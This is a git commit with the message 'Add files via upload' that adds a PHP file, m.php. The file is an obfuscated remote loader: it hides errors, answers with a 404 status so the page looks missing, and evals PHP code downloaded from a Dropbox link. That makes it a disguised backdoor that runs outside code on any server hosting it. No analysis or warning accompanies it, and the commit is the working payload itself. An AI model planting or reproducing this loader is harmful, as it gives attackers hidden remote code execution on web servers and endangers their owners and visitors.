9f4540931d97503a204a0748b425f16010297711
Flo <47207470+FloCasa@users.noreply.github.com>
2025-09-24 23:37:22 +0700

    Add files via upload

---
+++ m.php
@@ -0,0 +1,11 @@
+<?php 
+error_reporting(0);
+http_response_code(404);
+eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://www.dropbox.com/scl/fi/hzn1t7mqbvieqg6btp1ug/ohct.php?rlkey=66e1h7bi6vq8ebns97dfys548&st=407815mc&dl=1"
+            )
+        )
+); ?>
